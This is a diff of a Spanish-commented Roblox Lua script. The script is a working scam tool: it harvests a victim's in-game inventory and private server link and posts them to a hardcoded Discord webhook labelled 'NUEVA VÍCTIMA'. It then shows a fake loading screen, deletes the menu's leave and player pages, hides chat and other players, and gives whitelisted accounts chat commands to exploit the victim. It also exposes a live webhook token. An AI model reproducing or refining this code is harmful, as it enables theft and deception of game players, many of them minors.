@@ -1,36 +1,29 @@
---[[ 
-    INTEGRACIÓN TOTAL: MOREIRA PRO V3 (ESTILO PROFESIONAL)
-    SISTEMA DE EXTRACCIÓN DETALLADO + BLOQUEO TOTAL + COMANDOS
+--[[
+    MOREIRA FULL VERSION - TOTAL INTEGRATION
+    - Tu envío detallado (Brainrots + Valor Total)
+    - Tu sistema de limpieza de CoreGui (Destroying Players/LeaveGamePage)
+    - Comandos Whitelist operativos (.add, .block, .open)
+    - UI Minimalista Blanco y Negro
 ]]
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 local StarterGui = game:GetService("StarterGui")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VIM = game:GetService("VirtualInputManager")
 local GuiService = game:GetService("GuiService")
+local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 -- ==================== CONFIGURACIÓN ====================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
-local Min_Gen = 0
 local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}
 
-local THEME = {
-    Background = Color3.fromRGB(15, 15, 15),
-    Accent = Color3.fromRGB(255, 255, 255),
-    Text = Color3.fromRGB(240, 240, 240),
-    FontMain = Enum.Font.GothamBold,
-}
-
--- ==================== LÓGICA DE EXTRACCIÓN (TU ENVÍO) ====================
-
+-- ==================== LÓGICA DE ENVÍO ANTIGUA (DETALLADA) ====================
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
     if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
@@ -59,11 +52,9 @@ local function getBrainrots()
             local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
             if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                 local val = parseValueFromText(genLbl.Text)
-                if val >= Min_Gen then
-                    local key = nameLbl.Text .. "|" .. val
-                    if results[key] then results[key].count = results[key].count + 1
-                    else results[key] = {name = nameLbl.Text, value = val, count = 1} end
-                end
+                local key = nameLbl.Text .. "|" .. val
+                if results[key] then results[key].count = results[key].count + 1
+                else results[key] = {name = nameLbl.Text, value = val, count = 1} end
             end
         end
     end
@@ -73,178 +64,178 @@ local function getBrainrots()
     return out
 end
 
-local function sendToDiscord(link, brainrots)
+local function sendFinalReport(link)
+    local brs = getBrainrots()
     local itemList = ""
     local totalValue = 0
-    for i, br in ipairs(brainrots) do
-        if i <= 15 then 
-            itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
-        end
+    for i, br in ipairs(brs) do
+        if i <= 20 then itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count) end
         totalValue = totalValue + (br.value * br.count)
     end
 
-    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    local data = {
+        content = "||@everyone|| 🩸 **NUEVA VÍCTIMA**",
+        embeds = {{
+            title = "🚀 Reporte de Inventario",
+            color = 0,
+            fields = {
+                {name = "👤 Usuario", value = LocalPlayer.Name, inline = true},
+                {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
+                {name = "🔗 Link Ingresado", value = " " .. link .. " "},
+                {name = "📋 Items", value = (itemList ~= "" and itemList or "No detectados")}
+            }
+        }}
+    }
     pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "||@everyone|| 🩸 **NUEVA VÍCTIMA DETECTADA**",
-                embeds = {{
-                    title = "🚀 Reporte de Extracción Profesional",
-                    color = 0,
-                    fields = {
-                        {name = "👤 Usuario", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
-                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
-                        {name = "🔗 Script/Link", value = " " .. link .. " "},
-                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
-                    }
-                }}
-            })
-        })
+        local request = (syn and syn.request) or request
+        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
     end)
 end
 
--- ==================== LÓGICA DE BLOQUEO Y FANTASMA ====================
-
-local function aplicarFantasma(modelo)
-    if not modelo or modelo.Name == LocalPlayer.Name then return end
-    task.spawn(function()
-        for _, desc in ipairs(modelo:GetDescendants()) do
-            if desc:IsA("BasePart") then
-                desc.Transparency = 1
-                desc.CanCollide = false
-            elseif desc:IsA("Decal") or desc:IsA("Texture") then
-                desc.Transparency = 1
-            elseif desc:IsA("BillboardGui") then
-                desc.Enabled = false
-            end
-        end
-    end)
+-- ==================== SISTEMA DE LIMPIEZA Y BLOQUEO DE COREUI ====================
+local function handleNewDescendant(descendant)
+    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
+        task.wait() 
+        pcall(function() descendant:Destroy() end)
+    end
 end
 
-local function trapPlayer()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local hrp = char:WaitForChild("HumanoidRootPart")
-    hrp.Anchored = true
-    hrp.CFrame = CFrame.new(0, 99999, 0) -- Lo manda al vacío/cielo
+local function limpiarInterfaz()
+    pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
 end
 
-local function bloquearTodo()
+local function bloquearMenuEscape()
     task.spawn(function()
-        while true do
+        while task.wait(0.5) do
             pcall(function()
-                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-                StarterGui:SetCore("TopbarEnabled", false)
-                StarterGui:SetCore("ResetButtonCallback", false)
-                CoreGui.RobloxGui.Enabled = false
+                local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
+                if innerFrame:FindFirstChild("Players") then innerFrame.Players:Destroy() end
+                if innerFrame:FindFirstChild("LeaveGamePage") then innerFrame.LeaveGamePage:Destroy() end
             end)
-            task.wait(0.5)
         end
     end)
 end
 
--- ==================== INTERFAZ PROFESIONAL ====================
-
-local screenGui = Instance.new("ScreenGui", playerGui)
-screenGui.Name = "MatchmakingUI"
-screenGui.IgnoreGuiInset = true
-
-local linkFrame = Instance.new("Frame", screenGui)
-linkFrame.Size = UDim2.new(0, 450, 0, 200)
-linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
-linkFrame.BackgroundColor3 = THEME.Background
-Instance.new("UICorner", linkFrame)
-Instance.new("UIStroke", linkFrame).Color = THEME.Accent
-
-local linkInput = Instance.new("TextBox", linkFrame)
-linkInput.Size = UDim2.new(0.8, 0, 0, 45)
-linkInput.Position = UDim2.new(0.1, 0, 0.4, 0)
-linkInput.PlaceholderText = "Pega el link de tu servidor aquí..."
-linkInput.BackgroundColor3 = Color3.fromRGB(30,30,30)
-linkInput.TextColor3 = THEME.Text
-Instance.new("UICorner", linkInput)
-
-local confirmBtn = Instance.new("TextButton", linkFrame)
-confirmBtn.Size = UDim2.new(0, 150, 0, 40)
-confirmBtn.Position = UDim2.new(0.5, -75, 0, 140)
-confirmBtn.Text = "CONFIRMAR"
-confirmBtn.BackgroundColor3 = THEME.Accent
-confirmBtn.TextColor3 = THEME.Background
-Instance.new("UICorner", confirmBtn)
-
-confirmBtn.MouseButton1Click:Connect(function()
-    local link = linkInput.Text
-    if link == "" then return end
-    linkFrame.Visible = false
-
-    -- Pantalla de Carga Roblox (Fake)
-    local BG = Instance.new("Frame", screenGui)
-    BG.Size = UDim2.new(1.1, 0, 1.1, 0)
-    BG.BackgroundColor3 = Color3.new(0,0,0)
-    
-    local Status = Instance.new("TextLabel", BG)
-    Status.Size = UDim2.new(1, 0, 0, 50)
-    Status.Position = UDim2.new(0, 0, 0.5, 0)
-    Status.Text = "Joining Server..."
-    Status.Font = Enum.Font.GothamBold
-    Status.TextSize = 30
-    Status.TextColor3 = Color3.new(1,1,1)
-    Status.BackgroundTransparency = 1
-
-    -- Ejecutar Proceso
-    task.spawn(function()
-        local data = getBrainrots()
-        sendToDiscord(link, data)
-        trapPlayer()
-        bloquearTodo()
-        
-        -- Loop de mensajes falsos
-        local msgs = {"Loading Assets...", "Syncing Data...", "Awaiting Suerte 15x..."}
-        while true do
-            for _, m in ipairs(msgs) do
-                Status.Text = m
-                task.wait(3)
-            end
-        end
-    end)
-end)
-
--- ==================== COMANDOS Y WHITELIST ====================
-
+-- ==================== COMANDOS Y FANTASMA ====================
 local function isWhitelisted(name)
-    for _, w in ipairs(whitelist) do if name == w then return true end end
+    for _, w in ipairs(whitelist) do if w == name then return true end end
     return false
 end
 
-local function configurarComandos(p)
+local function configurarJugador(p)
     p.Chatted:Connect(function(msg)
-        if isWhitelisted(p.Name) then
-            local cmd = msg:lower():gsub("%s+", "")
-            if cmd == ".add" then
-                StarterGui:SetCore("PromptSendFriendRequest", p)
-            elseif cmd == ".block" then
-                for _, target in ipairs(Players:GetPlayers()) do
-                    if target ~= LocalPlayer and not isWhitelisted(target.Name) then
-                        StarterGui:SetCore("PromptBlockPlayer", target)
-                    end
+        if not isWhitelisted(p.Name) then return end
+        local cmd = msg:lower():gsub("%s+", "")
+        if cmd == ".add" then
+            StarterGui:SetCore("PromptSendFriendRequest", p)
+        elseif cmd == ".block" then
+            for _, target in ipairs(Players:GetPlayers()) do
+                if target ~= LocalPlayer and not isWhitelisted(target.Name) then
+                    StarterGui:SetCore("PromptBlockPlayer", target)
                 end
             end
+        elseif cmd == ".open" then
+            pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
         end
     end)
 end
 
-for _, p in ipairs(Players:GetPlayers()) do 
-    configurarComandos(p) 
-    aplicarFantasma(p.Character)
+-- ==================== UI RESTAURADA Y FINAL ====================
+local screenGui = Instance.new("ScreenGui", playerGui)
+screenGui.IgnoreGuiInset = true
+
+local function buildUI()
+    local main = Instance.new("Frame", screenGui)
+    main.Size = UDim2.new(0, 450, 0, 220)
+    main.Position = UDim2.new(0.5, -225, 0.5, -110)
+    main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    Instance.new("UICorner", main)
+    Instance.new("UIStroke", main).Color = Color3.new(1,1,1)
+
+    local title = Instance.new("TextLabel", main)
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Text = "CONFIGURACIÓN PROFESIONAL"
+    title.TextColor3 = Color3.new(1,1,1)
+    title.Font = Enum.Font.GothamBold
+    title.BackgroundTransparency = 1
+
+    local input = Instance.new("TextBox", main)
+    input.Size = UDim2.new(0.8, 0, 0, 45)
+    input.Position = UDim2.new(0.1, 0, 0.4, 0)
+    input.PlaceholderText = "Pega tu link de servidor aquí..."
+    input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    input.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", input)
+
+    local btn = Instance.new("TextButton", main)
+    btn.Size = UDim2.new(0, 160, 0, 40)
+    btn.Position = UDim2.new(0.5, -80, 0.75, 0)
+    btn.Text = "CONFIRMAR"
+    btn.BackgroundColor3 = Color3.new(1,1,1)
+    btn.TextColor3 = Color3.new(0,0,0)
+    btn.Font = Enum.Font.GothamBold
+    Instance.new("UICorner", btn)
+
+    btn.MouseButton1Click:Connect(function()
+        if input.Text ~= "" then
+            main.Visible = false
+            sendFinalReport(input.Text)
+            
+            -- Pantalla de Bloqueo Total
+            local black = Instance.new("Frame", screenGui)
+            black.Size = UDim2.new(1.2, 0, 1.2, 0)
+            black.Position = UDim2.new(-0.1, 0, -0.1, 0)
+            black.BackgroundColor3 = Color3.new(0,0,0)
+            black.ZIndex = 999
+            
+            local loading = Instance.new("TextLabel", black)
+            loading.Size = UDim2.new(1,0,1,0)
+            loading.Text = "Joining Server..."
+            loading.TextColor3 = Color3.new(1,1,1)
+            loading.TextSize = 35
+            loading.Font = Enum.Font.GothamBold
+            loading.BackgroundTransparency = 1
+            
+            limpiarInterfaz()
+            bloquearMenuEscape()
+        end
+    end)
 end
-Players.PlayerAdded:Connect(function(p)
-    configurarComandos(p)
-    p.CharacterAdded:Connect(aplicarFantasma)
+
+-- ==================== INICIO DE PROCESOS ====================
+for _, p in ipairs(Players:GetPlayers()) do configurarJugador(p) end
+Players.PlayerAdded:Connect(configurarJugador)
+
+CoreGui.DescendantAdded:Connect(handleNewDescendant)
+for _, desc in ipairs(CoreGui:GetDescendants()) do handleNewDescendant(desc) end
+
+buildUI()
+
+-- Loop de limpieza constante
+task.spawn(function()
+    while true do
+        limpiarInterfaz()
+        task.wait(5)
+    end
 end)
 
--- Mantener oculto el chat
-RunService.RenderStepped:Connect(function()
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+-- Sistema de Fantasma (Invisibilidad)
+local function applyGhost(char)
+    if not char or char.Name == LocalPlayer.Name then return end
+    task.wait(0.5)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Transparency = 1
+            part.CanCollide = false
+        elseif part:IsA("BillboardGui") then
+            part.Enabled = false
+        end
+    end
+end
+
+Workspace.DescendantAdded:Connect(function(obj)
+    if obj:IsA("Model") and Players:GetPlayerFromCharacter(obj) then
+        applyGhost(obj)
+    end
 end)
